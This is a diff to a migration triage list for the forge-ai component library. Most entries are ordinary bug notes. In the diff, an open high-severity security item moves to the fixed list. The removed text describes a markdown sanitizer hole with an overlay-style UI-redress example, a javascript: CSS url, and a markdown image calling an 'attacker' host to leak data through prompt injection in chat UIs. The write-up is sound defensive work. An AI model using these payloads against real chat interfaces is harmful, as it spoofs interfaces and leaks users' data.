@@ -32,6 +32,7 @@ Triage of bugs and oddities found during the forge-ai migration (TAI-438). Every
 - [F4] plop component template and `plopfile.mjs` index template emit `.js` extensions.
 - [F9 review/F10] `ai-prompt` dispatched `input` twice per keystroke (the native, composed textarea `input` escaping the shadow root, plus an explicit `Event('input')` re-dispatch from `_handleInput`). Confirmed with a test (2 events per keystroke, 6 for 3 typed characters). The re-dispatch is removed; the native `InputEvent` (with `inputType`/`data`) is now the only host `input` event, and `value` is already updated when it reaches host listeners. Tests: `ai-prompt/ai-prompt.test.ts`. No in-repo or foundry-chatbot consumer listens for `input` on `forge-ai-prompt`. Listed in MIGRATION.
 - [F9 review/F10] The overlay and dialog toggle-guard tests used a fixed 50ms `setTimeout`. Replaced with `updateComplete` plus two `requestAnimationFrame` waits (`settle`). Verified the plain-`toggle` tests still fail (3/3 runs) with the `event.target !== event.currentTarget` guard removed from both components.
+- **HIGH** Security: `renderMarkdown`/`renderInlineMarkdown` kept `style` attributes and remote images (UI redress, data exfiltration). Fixed by porting forge-ai#134.
 
 ## WONTFIX
 
@@ -63,7 +64,6 @@ Suggested owner in parentheses.
 - `npm deprecate @tylertech/forge-ai-react` after `@tylertech/forge-ai@0.16.0` publishes (outside this repo). `@tylertech/forge-ai-react` is currently at 0.15.1 on npm. (release engineering)
 - Vitest 5 is available (forge-ai and the other packages stay on `^4.1.x`). Bump `vitest`, `@vitest/browser`, `@vitest/browser-playwright` and `@vitest/coverage-v8` monorepo-wide in one pass rather than in a single package. (forge core / build tooling)
 - `typescript-eslint` (`^8.58.0`, newest 14-day-old release 8.72.0) and `@types/react` (19.2.14, newest eligible 19.3.0) are behind. Pinning them in forge-ai alone re-resolves eslint plugin peers and radix/inspector `@types/react` copies across the monorepo, so bump both monorepo-wide. (forge core)
-- **HIGH** Security: `renderMarkdown`/`renderInlineMarkdown` keep `style` attributes and remote images. Reviewer findings: (1) UI redress: a `position:fixed; inset:0` overlay in a `style` attribute survives sanitization and can cover or spoof the host UI. (2) Data exfiltration: CSS `url()` in `style`, `<img src>` and markdown images `![](https://attacker/?q=...)` load attacker URLs automatically, the classic prompt-injection leak in chat UIs. (`style="background:url(javascript:...)"` also survives; pinned by a test in `utils/markdown.test.ts`.) Recommended fix: `FORBID_ATTR` gains `'style'` (or an allowlist hook), plus a remote-image policy (host allowlist, or opt-in). Possibly breaking for markdown that relies on inline styles or remote images; check foundry-chatbot output before changing. (forge-ai team)
 
 ## Release follow-ups
 
